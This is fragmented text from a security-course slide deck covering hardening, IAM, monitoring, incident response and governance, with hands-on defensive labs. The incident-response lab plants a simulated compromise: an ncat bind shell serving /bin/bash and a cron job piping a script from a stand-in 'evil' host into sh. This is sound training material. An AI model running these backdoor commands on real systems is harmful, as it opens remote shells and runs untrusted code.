(mdadm)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Fail and remove one disk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mdadm /dev/md0 --fail $lo1 --remove $lo1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306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39 · Storage Resilience with Software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Storage Resilience with Software RAID (mdadm)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data survives on the degraded array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/mnt/r/data.txt &amp;&amp; mdadm --detail /dev/md0 | grep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307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Storage Resilience with Software RAID (mdadm)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array reports a degraded state after the disk failure yet still returns the original file contents.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308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Security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Segment networks with namespaces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Build allow-list firewalls and read counters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Deploy a layer-7 WAF with the OWASP CRS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Build an encrypted WireGuard tunnel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Encrypt data at rest with LUKS2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Audit and harden an HTTPS TLS config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Run encrypted backups and recover from ransomware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Apply least privilege and read a shared-responsibility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309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Hardening · IAM · MFA · SIEM · IDS · EDR · FIM · Packet analysis · Vuln mgmt · IR · Forensics · SOAR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310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EXAM WEIGHTING 28%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Security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Operational security hardens access (SSH, PAM, sudo, MFA) and monitors continuously (SIEM, IDS, EDR, file-integrity monitoring, packet analysis).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SIEM centralises and correlates logs; an IDS inspects network traffic; EDR and osquery interrogate endpoints; AIDE detects file tampering.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Vulnerability management is a continuous pipeline: discover, prioritise (CVSS), remediate and verify — with Trivy, OpenVAS and friends.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Incident response follows preparation → detection → containment → eradication → recovery → lessons learned, with digital forensics preserving evidence and SOAR automating the playbook.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311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Apply Secure Baselines &amp; Harden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Baselines · Hardening targets · Wireless · Mobile · Secure boot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312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4.1 ·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Baselines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baseline is the documented, minimum secure configuration for a system type.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Establish → deploy → maintain: build once, roll out everywhere, drift-check continuously.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industry benchmarks (CIS, DISA STIG) as the starting point — don't invent from scratch.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measure a host against a benchmark with OpenSCAP in Lab 35.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313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4.1 · REDUCE THE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Hardening Targets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Operating system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unused packages/services, patch, enforce config (Lab 13).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Servers &amp; workstations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Host firewall, EDR, least-privilege accounts.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Network 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 defaults, disable Telnet/HTTP, encrypt management.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Wireless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WPA3, 802.1X, disable WPS, segment guest.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Mobile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MDM policy, encryption, no jailbreak/root (Lab 41).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Boot chain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Secure Boot + TPM measured boot to stop rootkits.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314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4.2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Asset Management (Hardware, Software,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Acquisition · Inventory · Ownership · Disposal &amp; sanitisation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315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4.2 · ASSET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Asset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cannot protect what you don't know you have — a live inventory is control zero.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Track ownership and classification for every asset; assign a data owner and custodian.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Procurement/acquisition: vet the supply chain before it enters the estate.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Disposal: sanitise (wipe/degauss/destroy) and certify — a wiped disk is not a control unless verified (Lab 42).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316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4.3-4.4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Monitoring &amp; Vulnerability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SIEM · IDS/IPS · EDR · FIM · Packet analysis · Scan → prioritise → remediate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317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4.4 · SEE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Monitoring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Central log collection + correlation + alerting (ELK/Wazuh, Lab 24).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IDS / IPS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network traffic for known/anomalous patterns (Suricata, Lab 25).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EDR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Endpoint telemetry and response — query hosts with osquery (Lab 26).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File-integrity monitoring flags tampering (AIDE, Lab 27).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Packet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Dissect captures to prove what happened (PCAP Analyzer, Lab 40).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NetFlow / logs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Metadata reveals beaconing and exfiltration.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318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4.3 · CONTINUOUS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Discover — scan assets (OpenVAS, Trivy) and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Prioritise — score with CVSS + context (exposure, exploitability)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Remediate — patch, reconfigure, or apply a compensating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— re-scan to confirm the fix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Report — track SLAs and residual risk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319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4.3 · CVSS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CVSS — Prioritising by Severity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CVSS scores a vulnerability 0.0–10.0: None, Low, Medium, High, Critical.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Base metrics: attack vector, complexity, privileges required, user interaction, and CIA impact.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Score is a starting point — weight it by whether the asset is exposed and the exploit is in the wild.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score and rank findings in the risk register (Lab 31) and scan with Trivy (Lab 28).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320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4.4 · HANDS-ON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Try It — PCAP Analyzer &amp; Regex Generator (Ed Tools)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PCAP Analyzer: https://alfredang.github.io/pcapanalyzer/ — upload a capture and dissect protocols, flows and anomalies.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Regex Generator: https://alfredang.github.io/regexgenerator/ — build patterns for SIEM queries and log parsing.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regex to write a detection that fires on the IOC you found in the packet capture.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These power Labs 24 (SIEM), 25 (IDS) and 40 (packet analysis).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321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4.5-4.6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Identity &amp; Access Management (IAM)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Provisioning · Authentication · MFA · Authorization models · PAM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322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4.6 ·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Provisioning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Joiner-mover-leaver: create, change and REVOKE access promptly.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SSO &amp; federation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identity across services — SAML, OAuth2, OIDC.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MFA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Two+ different factors; TOTP/FIDO2 beat SMS (Lab 23).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Password policy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Length over complexity; block breached passwords.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Privileged Access Management — vault, check-out, session recording.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Just-in-time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Grant elevated rights only for the moment they're needed.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323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4.6 · WHO MAY DO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Authorization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How it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DAC — Discretionary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MAC — Mandatory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RBAC — Role-based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ABAC — Attribute-based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Rule-based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Least privilege + SoD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Owner grants access at their discretion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System enforces labels/clearances (no override)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Access by job role — scales in the enterprise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Access by attributes (dept, time, device, risk)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Access by explicit rules/conditions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Minimum rights; split sensitive duties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324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4.6 · IN THE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Hardening Access — sudo, PAM, SSH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sudo grants scoped, logged elevation — never share root (Lab 22).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PAM stacks the rules for authentication, account, session and password quality.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SSH: keys over passwords, disable root login, and fail2ban to blunt brute force (Lab 21).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Accounting ties every privileged action back to a person — the third A of AAA.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325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Automation &amp; Orchestration (SOAR)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Use cases · Benefits · Playbooks · Guardrails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326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4.7 · SOAR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Automate Security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SOAR turns a written runbook into an executable playbook — consistent, fast, auditable.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cases: enrich alerts, auto-triage phishing, quarantine a host, disable a leaked account, open a ticket.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Benefits: reaction time, scale, fewer human errors, and analysts freed for real investigation.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Guardrails: automation acts with high privilege — test in staging, keep a human approval for destructive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327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4.8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Incident Response &amp; Digital Forensics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IR lifecycle · Detection · Containment · Forensics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328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4.8 · IR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Incident Response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Preparation — plans, tools, training, comms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Detection &amp; analysis — identify and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Containment — short-term stop + long-term isolation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Eradication &amp; recovery — remove, patch, restore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Lessons learned — improve the controls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329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4.8 ·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&amp; Evidence Handling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Order of volatility: capture RAM/registers first, disk later, backups last.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Chain of custody: who collected what, when, and how it was protected — or it's inadmissible.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Hash the image on acquisition and re-verify — proves the evidence is unaltered (Lab 29, Lab 43 Autopsy).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Legal hold preserves data once litigation is anticipated; document every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330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Security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21–25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SSH Hardening + Fail2ban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IAM with PAM and sudo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Multi-Factor Authentication with TOTP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SIEM Basics with Wazuh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Network IDS with Suricata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26–30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Endpoint Detection with osquery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File Integrity Monitoring with AIDE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Vulnerability Management with Trivy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Incident Response and Forensics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Automation and Orchestration (Mini-SOAR)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Labs 40–43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Packet Capture &amp; Traffic Analysis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Mobile &amp; Endpoint Hardening Baseline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Secure Data Sanitisation (Media Disposal)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Digital Forensics — Evidence Acquisition &amp; Hashing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331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Switch SSH to key-based authentication and let Fail2ban ban repeated failed logins.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Key-only SSH server with an active brute-force jail.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openssh-server, fail2ban, ssh-keygen, iptables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332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SSH Hardening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Fail2ban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fail2ban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333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SSH Hardening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an ed25519 key pair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ssh-keygen -t ed25519 -f ~/.ssh/lab_ed25519 -N "" -C "lab-key"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334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SSH Hardening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Authorize the public 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~/.ssh/lab_ed25519.pub &gt;&gt; ~/.ssh/authorized_keys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335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SSH Hardening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Harden sshd (key-only, no root password)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/etc/ssh/sshd_config.d/99-hardening.conf &lt;&lt;'EOF'
PermitRootLogin prohibit-password
PasswordAuthentication no
MaxAuthTries 3
EOF
systemctl restart ssh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336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SSH Hardening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Configure an sshd jail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/etc/fail2ban/jail.d/sshd.local &lt;&lt;'EOF'
[sshd]
enabled = true
backend = systemd
maxretry = 3
bantime = 1h
EOF
systemctl restart fail2ban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337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SSH Hardening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Trigger a ban with failed logins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for i in 1 2 3 4 5; do ssh -o PubkeyAuthentication=no -o StrictHostKeyChecking=no baduser@127.0.0.1 2&gt;/dev/null;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338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SSH Hardening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Check the ban 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fail2ban-client status sshd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339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SSH Hardening + Fail2ban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Unban as admin override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fail2ban-client set sshd unbanip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340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SSH Hardening + Fail2ban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fail2ban-client status sshd lists 127.0.0.1 as banned, and password login is rejected.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341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Map Linux groups to roles, restrict sudo per role, and enforce time and lockout policy via PAM.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Three RBAC roles with scoped sudo, pam_time and pam_faillock.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sudo, PAM, pam_time, pam_faillock, chage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342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· IAM with PAM and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role groups and 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groupadd webops; useradd -m -G webops alice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343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· IAM with PAM and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Scope sudo per role in sudoers.d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/etc/sudoers.d/roles &lt;&lt;'EOF'
%webops ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx
EOF
chmod 440 /etc/sudoers.d/roles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344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· IAM with PAM and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least privilege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su - alice -c 'sudo systemctl status nginx 2&gt;&amp;1 | head -2'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345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· IAM with PAM and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a time-of-day restriction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'*;*;alice;Wd0900-1800' &gt;&gt; /etc/security/time.conf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346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· IAM with PAM and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Enable pam_time in the login stack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grep -q pam_time /etc/pam.d/login || echo 'account required pam_time.so' &gt;&gt; /etc/pam.d/login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347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· IAM with PAM and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Configure and enable pam_faillock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sed -i '/pam_unix.so/i auth required pam_faillock.so preauth silent' /etc/pam.d/common-auth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348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· IAM with PAM and sudo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De-provision (offboard) a user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usermod -L alice; chage -E 0 alice; passwd -S alice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349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IAM with PAM and sudo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alice can restart nginx but not run mysqldump, and faillock counts failed attempts.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350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Enrol a user with Google Authenticator's PAM module and enforce SSH key plus TOTP.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SSH requiring publickey and a TOTP one-time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libpam-google-authenticator, qrencode, oathtool, PAM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351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· Multi-Factor Authentication with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 PAM module and helpers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libpam-google-authenticator qrencode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352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· Multi-Factor Authentication with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Enrol a user with a TOTP secret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sudo -u mfauser google-authenticator -t -d -f -r 3 -R 30 -W -q -s /home/mfauser/.google_authenticator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353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· Multi-Factor Authentication with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Display the secret as a QR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qrencode -t ANSI "otpauth://totp/lab:mfauser?secret=$SECRET&amp;issuer=lab"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354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· Multi-Factor Authentication with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Wire the module into SSH PAM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'auth required pam_google_authenticator.so' &gt;&gt; /etc/pam.d/sshd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355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· Multi-Factor Authentication with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Require two factors in sshd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'AuthenticationMethods publickey,keyboard-interactive' &gt;&gt; /etc/ssh/sshd_config; systemctl restart ssh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356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· Multi-Factor Authentication with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a code from the CLI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oathtool &amp;&amp; oathtool --totp -b "$SECRET"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357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· Multi-Factor Authentication with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Log in with key + code to verify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358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Multi-Factor Authentication with TOTP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SSH login succeeds only after both the key and a valid 6-digit TOTP code.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359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Install Wazuh all-in-one, register an agent, and pivot a brute-force alert to the attacker IP.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Single-node Wazuh manager, indexer, dashboard and local agent.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Wazuh manager/indexer/agent, curl, jq, REST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360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SIEM Basics with Wazuh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Download and run the all-in-one installer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-sO https://packages.wazuh.com/4.9/wazuh-install.sh &amp;&amp; bash wazuh-install.sh -a -i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361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SIEM Basics with Wazuh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core services and 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systemctl status wazuh-manager --no-pager | head -5; ss -tlnp | grep -E '1514|55000|9200'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362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SIEM Basics with Wazuh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Register and install a local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/var/ossec/bin/manage_agents -a -n local -i 127.0.0.1 -q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363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SIEM Basics with Wazuh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 agent package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WAZUH_MANAGER='127.0.0.1' dpkg -i wazuh-agent_4.9.0-1_amd64.deb; systemctl enable --now wazuh-agent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364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SIEM Basics with Wazuh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brute-force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for i in $(seq 1 10); do ssh -o PubkeyAuthentication=no baduser@127.0.0.1 2&gt;/dev/null;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365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SIEM Basics with Wazuh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Read the correlated alert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grep -E 'rule_id|level' /var/ossec/logs/alerts/alerts.log |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366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SIEM Basics with Wazuh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Query alerts via the REST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TOKEN=$(curl -sk -u wazuh-wui:wazuh-wui -X POST https://localhost:55000/security/user/authenticate | jq -r .data.token)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367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SIEM Basics with Wazuh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Pivot to srcip in the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368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SIEM Basics with Wazuh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Rule 5712 (SSHD brute force) at level 10 appears and its srcip is the attacker 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369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Run Suricata in IDS mode with ET Open rules, trigger a known alert, then add a custom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Suricata IDS logging alerts to eve.json with a custom rule.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suricata, suricata-update, jq, curl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370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· Network IDS with Suricata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Suricata and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suricata jq &amp;&amp; suricata-update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371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· Network IDS with Suricata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live interface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IFACE=$(ip route | awk '/default/ {print $5; exit}'); echo $IFACE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372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· Network IDS with Suricata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Suricata in IDS mode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suricata -i $IFACE -l /var/log/suricata --runmode workers -D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373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· Network IDS with Suricata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Trigger a known signature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--user-agent "test" "http://testmynids.org/uid/index.html"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374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· Network IDS with Suricata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Read the alert from eve.json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jq -c 'select(.event_type=="alert") | {sig:.alert.signature, src:.src_ip}' /var/log/suricata/eve.json |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375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· Network IDS with Suricata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Write and include a custom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/etc/suricata/rules/lab.rules &lt;&lt;'EOF'
alert http any any -&gt; any any (msg:"LAB curl UA"; http.user_agent; content:"curl/"; sid:9000002; rev:1;)
EOF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376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· Network IDS with Suricata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Reload rules and trigger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suricatasc -c reload-rules; curl -s "http://example.com/?id=1" &gt;/dev/null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377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Network IDS with Suricata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eve.json shows the ET Open alert and the custom sid 9000002 firing on the curl request.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378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Install osquery, ask SQL questions of the live host, and schedule high-signal detections.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osquery interactive shell plus a scheduled osqueryd detection pack.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osquery, osqueryi, osqueryd, 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379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· Endpoint Detection with osquery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the repo and install osquery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-fsSL https://pkg.osquery.io/deb/pubkey.gpg | gpg --dearmor -o /usr/share/keyrings/osquery.gpg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380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· Endpoint Detection with osquery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 package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'deb [arch=amd64 signed-by=/usr/share/keyrings/osquery.gpg] https://pkg.osquery.io/deb deb main' &gt; /etc/apt/sources.list.d/osquery.list &amp;&amp; apt update &amp;&amp; apt install -y osquery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381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· Endpoint Detection with osquery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interactive SQL queries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osqueryi --json "SELECT * FROM listening_ports WHERE address = '0.0.0.0';"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382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· Endpoint Detection with osquery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Detect a fileless process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cp /bin/sleep /tmp/.evil; /tmp/.evil 600 &amp; rm /tmp/.evil; osqueryi --json "SELECT name, pid FROM processes WHERE on_disk = 0;"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383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· Endpoint Detection with osquery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Detect SUID binaries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osqueryi --json "SELECT path, mode FROM file WHERE path LIKE '/usr/bin/%' AND mode LIKE '%4%' LIMIT 10;"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384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· Endpoint Detection with osquery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Schedule queries with osqueryd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/etc/osquery/osquery.conf &lt;&lt;'EOF'
{ "schedule": { "fileless_proc": { "query": "SELECT name, pid FROM processes WHERE on_disk = 0;", "interval": 60 } } }
EOF
systemctl enable --now osqueryd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385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· Endpoint Detection with osquery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Read the JSON results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tail -3 /var/log/osquery/osqueryd.results.log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386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Endpoint Detection with osquery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osqueryd writes JSON results and the on_disk=0 query surfaces the deleted-binary process.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387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Baseline critical files with AIDE, tamper one, and watch the integrity diff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AIDE baseline database with a daily integrity check.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aide, aideinit, cron, logger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388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· File Integrity Monitoring with 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AIDE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aide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389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· File Integrity Monitoring with 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custom check groups and scope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/etc/aide/aide.conf.d/99_lab &lt;&lt;'EOF'
LAB_NORMAL = p+i+n+u+g+s+m+c+sha256
/etc/passwd LAB_NORMAL
/etc/sudoers LAB_NORMAL
EOF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390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· File Integrity Monitoring with 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Initialise the baseline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aideinit -y -f &amp;&amp; mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db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391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· File Integrity Monitoring with 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a clean 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aide --check | head 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392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· File Integrity Monitoring with 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Tamper and re-check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'# tampered' &gt;&gt; /etc/sudoers; useradd -m attacker; aide --check 2&gt;&amp;1 | head -25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393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· File Integrity Monitoring with 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Roll the baseline forward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aide --update -B 'database_new=file:/var/lib/aide/aide.db.new' &amp;&amp; mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db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394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· File Integrity Monitoring with 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Schedule a daily check to syslog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/etc/cron.daily/aide-check &lt;&lt;'EOF'
#!/bin/sh
/usr/bin/aide --check | logger -t aide
EOF
chmod +x /etc/cron.daily/aide-check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395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File Integrity Monitoring with AIDE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After tampering, aide --check reports the changed sudoers and new user; a clean baseline reports none.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396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Scan an OS, filesystem, and container image with Trivy and export a CVSS-sorted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Trivy scanning pipeline producing a prioritised remediation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trivy, jq, docker.io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397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· Vulnerability Management with Triv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the Trivy repo and install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wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor &gt; /usr/share/keyrings/trivy.gpg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398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· Vulnerability Management with Triv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Register the generic repo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'deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main' &gt; /etc/apt/sources.list.d/trivy.list &amp;&amp; apt update &amp;&amp; apt install -y trivy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399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· Vulnerability Management with Triv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Scan the running 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trivy rootfs --scanners vuln --severity HIGH,CRITICAL / 2&gt;/dev/null | tail -40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400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· Vulnerability Management with Triv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Export findings to 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trivy rootfs --severity HIGH,CRITICAL --format json -o trivy.json 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401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· Vulnerability Management with Triv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Scan a container image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docker pull node:14-alpine &amp;&amp; trivy image --severity HIGH,CRITICAL node:14-alpine | head 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402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· Vulnerability Management with Triv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Build a CVSS-sorted patch queue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trivy image --format json node:14-alpine | jq -r '.Results[].Vulnerabilities[]? | [.VulnerabilityID, .Severity, (.CVSS.nvd.V3Score // 0)] | @tsv' | sort -k3,3 -nr | head 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403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· Vulnerability Management with Triv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Scan for hardcoded secrets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trivy fs --scanners secret src/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404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Vulnerability Management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Trivy lists HIGH/CRITICAL CVEs, produces a CVSS-sorted top-10, and flags the planted AWS secret.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405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Simulate a compromise then work the NIST IR phases, preserving evidence with SHA-256 hashes.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full triage-to-report incident workflow on a simulated compromise.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ncat, ss, ps, crontab, sha256sum, iptables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406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Incident Response and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Prepare an evidence drop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mkdir -p /evidence/$(date +%Y%m%d) &amp;&amp; cd /evidence/$(date +%Y%m%d)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407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Incident Response and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Plant the compromise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apt-get install -y ncat; nohup ncat -lk 4444 -e /bin/bash &amp; echo '* * * * * curl -s http://evil/loader.sh | sh' | crontab -u attacker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408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Incident Response and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Detect indicators of compromise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ss -tlnp | grep 4444; ps -ef | grep -E 'ncat|bash'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409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Incident Response and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Collect volatile evidence and hash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ps auxf &gt; ps.txt; ss -tnp &gt; sockets.txt; sha256sum *.txt *.log &gt; evidence.sha256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410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Incident Response and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Contain the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iptables -I INPUT -p tcp --dport 4444 -j DROP; usermod -L attacker; pkill -u attacker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411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Incident Response and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Eradicate the threat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crontab -u attacker -r; pkill ncat; userdel -rf attacker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412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Incident Response and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Validate recovery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ss -tlnp | grep 4444 || echo 'no backdoor listener'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413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Incident Response and Forensics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the incident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report.md &lt;&lt;EOF
# Incident report
EOF
sha256sum report.md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414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Incident Response and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listener/user/cron are gone at recovery and evidence.sha256 re-verifies with no tampering.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415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Write a bash SOAR playbook that watches auth.log, auto-bans IPs, opens tickets, and logs.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systemd-managed mini-SOAR service auto-banning brute-force IPs.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bash, awk, iptables, systemd, logger, inotify-tools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416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· Automation and Orchestration (Mini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inotify-tools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update &amp;&amp; apt install -y inotify-tools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417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· Automation and Orchestration (Mini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Write the SOAR playbook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/usr/local/bin/soar.sh &lt;&lt;'EOF'
#!/bin/bash
tail -F /var/log/auth.log | while read -r line; do ...; done
EOF
chmod +x /usr/local/bin/soar.sh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418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· Automation and Orchestration (Mini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it as a systemd unit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&gt; /etc/systemd/system/soar.service &lt;&lt;'EOF'
[Service]
ExecStart=/usr/local/bin/soar.sh
Restart=always
EOF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419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· Automation and Orchestration (Mini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Enable the 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systemctl daemon-reload &amp;&amp; systemctl enable --now soar.service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420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· Automation and Orchestration (Mini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Trigger brute-force traffic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for i in $(seq 1 6); do ssh -o PubkeyAuthentication=no bad@127.0.0.1 2&gt;/dev/null;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421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· Automation and Orchestration (Mini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Observe tickets, bans, and logs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ls /var/tickets/; iptables -L INPUT -n | head; journalctl -t soar -n 5 --no-pager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422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· Automation and Orchestration (Mini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an API escalation hook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-X POST https://hooks.slack.com/services/... -d '...'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423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Automation and Orchestration (Mini-SOAR)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 ticket JSON is created, the source IP is DROPped in iptables, and a soar syslog entry appears.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424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Packet Capture &amp; Traffic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captures live traffic with tcpdump, saves a PCAP, and analyses it for suspicious flows — the same skill a SOC analyst uses to confirm an alert.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saved PCAP plus a filtered analysis showing the target flow and any cleartext credentials.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tcpdump, tshark, curl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425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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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 capture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tcpdump tshark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426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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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Capture traffic to a PCAP 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tcpdump -i any -w /tmp/cap.pcap -c 50 &amp;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427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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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some HTTP traffic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http://example.com &gt; /dev/null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428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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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conversations in the capture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tshark -r /tmp/cap.pcap -q -z conv,ip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429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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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Filter for a suspicious port / plaintext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tshark -r /tmp/cap.pcap -Y 'http.request' -T fields -e ip.dst -e http.host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430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40 · Packet Capture &amp; Traffic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Packet Capture &amp; Traffic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Upload the PCAP to the browser PCAP Analyzer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"Open https://alfredang.github.io/pcapanalyzer/ and load /tmp/cap.pcap"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431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Packet Capture &amp; Traffic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PCAP is written and tshark lists the IP conversations and the HTTP requests it contains.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432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Mobile &amp; Endpoint Hardening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applies a hardening baseline to a Linux endpoint (the stand-in for a managed mobile/endpoint), disabling weak services and enforcing policy, then verifies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hardened host with password policy, disabled root SSH, and a screen-lock/idle-timeout policy — verified against a checklist.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sshd_config, login.defs, pam, systemctl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433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41 · Mobile &amp; Endpoint Hardening Baseli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Mobile &amp; Endpoint Hardening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Enforce a minimum password age/length policy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sed -i "s/^PASS_MIN_LEN.*/PASS_MIN_LEN 12/" /etc/login.defs 2&gt;/dev/null; grep PASS_ /etc/login.defs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434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41 · Mobile &amp; Endpoint Hardening Baseli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Mobile &amp; Endpoint Hardening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Disable direct root SSH login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sed -i "s/^#*PermitRootLogin.*/PermitRootLogin no/" /etc/ssh/sshd_config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435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41 · Mobile &amp; Endpoint Hardening Baseli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Mobile &amp; Endpoint Hardening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an idle session timeout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"TMOUT=600; readonly TMOUT" &gt; /etc/profile.d/timeout.sh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436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41 · Mobile &amp; Endpoint Hardening Baseli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Mobile &amp; Endpoint Hardening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Disable an unneeded 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systemctl disable --now avahi-daemon 2&gt;/dev/null; echo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437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41 · Mobile &amp; Endpoint Hardening Baseli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Mobile &amp; Endpoint Hardening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Verify the baseline against a checklist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grep PermitRootLogin /etc/ssh/sshd_config &amp;&amp; cat /etc/profile.d/timeout.sh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438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Mobile &amp; Endpoint Hardening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Root SSH login is disabled, the password policy is set, and the idle-timeout policy is present.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439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Data Sanitisation (Media Disposal)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writes sensitive data to a virtual disk, then securely sanitises it and verifies the data is unrecoverable — the disposal stage of the asset lifecycle.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wiped virtual disk whose sensitive string is no longer recoverable, with before/after evidence.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dd, shred, grep, strings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440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42 · Secure Data Sanitisation (Media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Data Sanitisation (Media Disposal)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virtual disk with secret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dd if=/dev/zero of=/disk.img bs=1M count=50 &amp;&amp; echo "TOP-SECRET-DATA" &gt;&gt; /disk.img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441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42 · Secure Data Sanitisation (Media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Data Sanitisation (Media Disposal)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the secret is present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strings /disk.img | grep TOP-SECRET &amp;&amp; echo FOUND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442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42 · Secure Data Sanitisation (Media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Data Sanitisation (Media Disposal)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Securely overwrite the media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shred -v -n 3 -z /disk.img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443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42 · Secure Data Sanitisation (Media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Data Sanitisation (Media Disposal)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Confirm the secret is gone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strings /disk.img | grep TOP-SECRET || echo "SANITISED — not recoverable"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444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42 · Secure Data Sanitisation (Media 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Data Sanitisation (Media Disposal)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Note the method for the disposal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"Method: 3-pass overwrite + zero (NIST 800-88 clear)"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445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Secure Data Sanitisation (Media Disposal)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secret string is found before shred and is absent after — sanitisation is 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446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— Evidence Acquisition &amp; Hashing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The learner acquires a bit-for-bit forensic image of evidence media, hashes it for integrity, recovers a deleted artefact, and records the chain of custody.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forensic image with matching acquisition/verification hashes and a recovered deleted file.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dd, sha256sum, foremost, mmls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447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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Prepare evidence media with a file, then delete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dd if=/dev/zero of=/ev.img bs=1M count=20; mkfs.ext4 /ev.img; mkdir -p /m; mount /ev.img /m; echo secret &gt; /m/evidence.txt; rm /m/evidence.txt; umount /m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448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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Acquire a bit-for-bit image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dd if=/ev.img of=/case01.dd bs=512 conv=noerror,sync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449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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Hash the image on acquisition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sha256sum /case01.dd | tee /case01.sha256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450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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Recover the deleted artefact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foremost &amp;&amp; foremost -i /case01.dd -o /recovered 2&gt;&amp;1 | tail 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451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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Re-verify the image hash is unchanged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sha256sum -c /case01.sha256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452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43 · Digital Forensics — Evidence Acqui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— Evidence Acquisition &amp; Hashing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Record the chain of custody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echo "Collected by: &lt;analyst&gt;  Date: &lt;UTC&gt;  Hash: $(cut -d" " -f1 /case01.sha256)"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453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Forensics — Evidence Acquisition &amp; Hashing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acquisition and verification hashes match, and foremost recovers file data from the image.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454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Security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Harden SSH to key-only auth and auto-ban brute-force IPs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Model RBAC with groups, scope sudo per role, add PAM controls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Add a TOTP second factor to SSH via a PAM module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Stand up a single-node SIEM and pivot from an alert to an IP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Run Suricata IDS, load rules, and write a custom signature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Query the host with SQL and schedule detections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Baseline critical files and detect tampering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Scan OS, filesystem, and image and prioritise by CVSS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455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Program Management &amp; Oversight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Governance · Risk &amp; CVSS · Third-party risk · Compliance · Audits &amp; pentesting · Awareness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456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EXAM WEIGHTING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Security Program Management &amp; Oversight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Governance sets direction: policies, standards, procedures and guidelines assign accountability for security outcomes.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Risk management records threats in a register, scores them (CVSS, likelihood × impact) and drives treatment decisions; third-party risk extends this to vendors.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Reconnaissance — passive OSINT and active scanning with Nmap — maps an organisation's exposure the way an attacker would; penetration testing safely validates exploitability.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Oversight proves control effectiveness through compliance auditing (OpenSCAP/CIS) and measurable security-awareness testing.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457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Security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Policies · Standards · Procedures · Roles · Regulations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458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5.1 · DIRECTION FROM THE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Governance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Policy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High-level intent — 'we protect customer data' (board-approved).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Mandatory 'what' — e.g. AES-256, TLS 1.2+.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Procedure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'how' — the runbook.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Guideline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Recommended 'best-practice' — advisory, not mandatory.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Owner, steward, custodian, processor — accountability.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Frameworks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NIST CSF, ISO 27001, CIS map controls to outcomes.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459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5.1 · COMPLIANCE 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Regulatory &amp; Legal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Regulations set the floor: GDPR, PDPA (Singapore), HIPAA, PCI-DSS, SOX.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Governance structures (steering committee, board oversight) assign accountability for meeting them.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Non-compliance is a business risk: fines, breach liability and reputational damage.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Map each regulation to concrete controls so an auditor can trace requirement →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460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5.2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Risk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Identify · Assess · Register · Treat · Appetite &amp; tolerance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461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5.2 · MANAGE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Risk Management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= likelihood × impact. Identify assets and threats, then assess each risk.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Assessment can be qualitative (High/Med/Low) or quantitative (SLE = AV × EF; ALE = SLE × ARO).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risk register records each risk, its owner, score and treatment — the single source of truth.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build a CVSS-scored risk register in Lab 31.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462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5.2 · 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Treatment &amp; Appetite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Mitigate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controls to reduce likelihood or impact.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Transfer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Shift the risk — insurance, outsourcing.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Avoid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Stop the activity that creates the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Accept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Formally tolerate residual risk within appetite.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appetite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much risk the business is willing to take.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 tolerance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acceptable variance around that appetite.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463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5.3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Third-Party Risk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Vendor assessment · Agreements · Supply chain ·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464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5.3 · THIRD PARTIES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Managing Vendor &amp; Supply-Chain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Your security is only as strong as your weakest vendor — many breaches enter through suppliers.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before onboarding: questionnaires, audits, penetration-test attestations, SOC 2 reports.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Bind expectations in agreements: SLA, SLO, MOU, MSA, BPA, NDA and a right-to-audit clause.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Monitor continuously — a vendor's posture drifts; re-assess on a schedule and on incidents.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465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Security Audits &amp; Assessments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Internal vs external · Attestation · Penetration testing · Recon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466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5.4 · PROVE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Audits vs Penetration Tests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Audit /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Penetration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Internal (self-assessment, audit committee)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External (regulatory exam, independent third party)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Attestation and compliance evidence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Compliance auditing with OpenSCAP/CIS (Lab 35)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Authorised, scoped exploitation to prove risk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Known / partially-known / unknown environment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Recon → scan → exploit → report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Always needs authorisation + Rules of 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467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Reconnaissance &amp; Testing in the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Passive OSINT gathers intel without touching the target (Lab 32) — Ethical Hacking Toolkit ed-tool.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Active scanning maps live hosts, ports and services with Nmap (Lab 33).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Metasploit safely validates exploitability in a lab range (Lab 34).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Every engagement is authorised and scoped — the FauxBank ed-tool is your legal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468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468880"/>
            <a:ext cx="12801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OBJECTIVE 5.5-5.6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Security Awareness &amp;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Training · Phishing simulations · Reporting ·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469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5.6 · THE HUMAN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 Programs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People are the largest attack surface — a trained workforce is a measurable control.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Run recurring training plus phishing simulations; measure click-rate and report-rate over time.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Anomalous-behaviour recognition and easy reporting turn every employee into a sensor.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run a real phishing-awareness campaign with GoPhish in Lab 36 and measure the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470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OBJ 5.6 · CLOSING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Compliance, Attestation &amp;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Compliance monitoring proves controls stay effective between audits — automate the evidence.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Attestation: management formally states controls are in place; internal and external assessments verify it.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Report metrics up (risk posture, KPIs) and consequences of non-compliance (fines, sanctions, loss of trust).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="11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Governance → risk → controls → audit → improve is the program cycle this domain closes.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471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Security Program Management &amp; Oversight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31–32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Risk Register, CVSS Scoring, and Quantitative Risk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Passive Reconnaissance / OSINT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33–34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Active Reconnaissance with Nmap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Penetration Testing with Metasploit (Authorised Lab)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Labs 35–36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Compliance Audit with OpenSCAP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Security Awareness: Run a Phishing Simulation with GoPhish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472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Register, CVSS Scoring, and Quantitative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a CSV risk register, score findings with CVSS v3.1, and calculate ALE to justify control spend.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CSV risk register with CVSS and ALE math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python3, FIRST.org CVSS calculator, column, bash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473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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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and view the CSV risk register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column -t -s, risk-register.csv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474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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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Score R-001 on the FIRST.org CVSS v3.1 calculator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https://www.first.org/cvss/calculator/3.1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475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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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Compute SLE and ALE in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python3 -c "print(200000*0.6*0.5)"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476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31 · Risk Register, CVSS Scoring, and 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Register, CVSS Scoring, and Quantitative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Choose a risk treatment (mitigate vs 